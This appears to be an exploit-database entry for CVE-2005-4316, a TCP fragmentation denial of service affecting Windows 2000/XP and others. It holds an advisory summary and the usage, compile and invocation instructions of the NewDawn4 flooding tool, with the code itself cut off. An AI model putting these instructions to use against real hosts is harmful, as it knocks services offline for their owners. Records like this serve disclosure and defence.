    "text": "ecve : CVE-2005-4316 ， title : Microsoft Windows XP - TCP Packet Fragmentation Handling Denial of Service ( 4 ) - Windows dos Exploit ， verified : Verified ， exploit_detail : // source :  ， Multiple vendor implementations of the TCP stack are reported prone to a remote denial-of-service vulnerability. ， The issue is reported to present itself due to inefficiencies present when handling fragmented TCP packets. ， The discoverer of this issue has dubbed the attack style the \"New Dawn attack\" ; it is a variation of a previously reported attack that was named the \"Rose Attack\". ， A remote attacker may exploit this vulnerability to deny service to an affected computer. ， Microsoft Windows 2000/XP , Linux kernel 2.4 tree , and undisclosed Cisco systems are reported prone to this vulnerability ; other products may also be affected. ， / * ------------------------------------------------------------- * / ， / *  ， Implementation of Rose Attack described by Gandalf gandalf at digital.net ， NewDawn4.c written by Ken Hollis based on the code rose.c ， written by Laurent Constantin and NewDawn.c and NewDawn2.c ， written by chuck modified from large IGMP attack by Kox by ， Coolio ( coolio ( at ) k-r4d.com )  ， Program allows choice of TCP or UDP , number of packets to fragment , number ， of fragments per packet and number of times the last fragment is ， rewritten. ， Based on a conversation where it was mentioned that a highly fragmented ， packet would cause high CPU utilization if the last fragment was written ， over and over again. ， As chuck says , death by a thousand cuts. ， NewDawn4 allows smaller fragments ( 8 bytes ) to be sent to the host. See :  ， Usage : ./NewDawn4 type ( 1or2 ) ipaddress [ port ]  [ NumP ]  [ Numt ]  [ NumR ]  [ NumF ]  [ NumD ]  ， Example : ./NewDawn4 1 1.2.3.4 80 5 9999 99999999 4080 2 ， type : 1=tcp , 2=udp ， ipaddress : address to test ， port : optional port number ( 0 means random )  ， NumP : Number of packets to fragment ( less than 1000 )  ， NumT : Number of times last fragment is rewritten ， NumR : Number of times to run test ， NumF : Number of fragments per packet ， NumD : Delta between fragements. 2 = 8 bytes blank ， 16 bytes total between fragments ( 8 bytes ， payload + 8 bytes blank = 16 bytes )  ,  ， 5 = 32 bytes blank ( 8 bytes payload + 32 bytes ， blank = 40 bytes total = 5 * 8 ) . ， Library netwib must be installed :  ， To compile and run :  ， gcc -Wall -o NewDawn4 NewDawn4.c `netwib-config -lc` ， ./NewDawn4 1 www.example.com 80 ， The command :  ， ./NewDawn4 1 10.12.14.16 ， Is equivalent to :  ， ./NewDawn4 1 10.12.14.16 0 5 9999 99999999 1021 8 ， Where :  ， ./NewDawn4 = Program Name ， 1 = TCP ， 10.12.14.16 = IP Address ， 0 = Random port numbers ， 5 = Five packets to fragment before staring next set of packets ， 9999 = The number of times to rewrite the last fragment of ， the five packets ， 99999999 = The number of times to run this entire attack ， 1021 = The number of middle fragments to write. ， 8 = 64 bytes , 8 byte data + 56 bytes blank fragments ( 8 bytes * 8 = 64 )  ， This was successfully tested with netwib 5.12.0 , under Linux ， to test a Windows 2000 host. Local network is Ethernet. ，  * / ， / * ------------------------------------------------------------- * / ， // Test large number of packets",
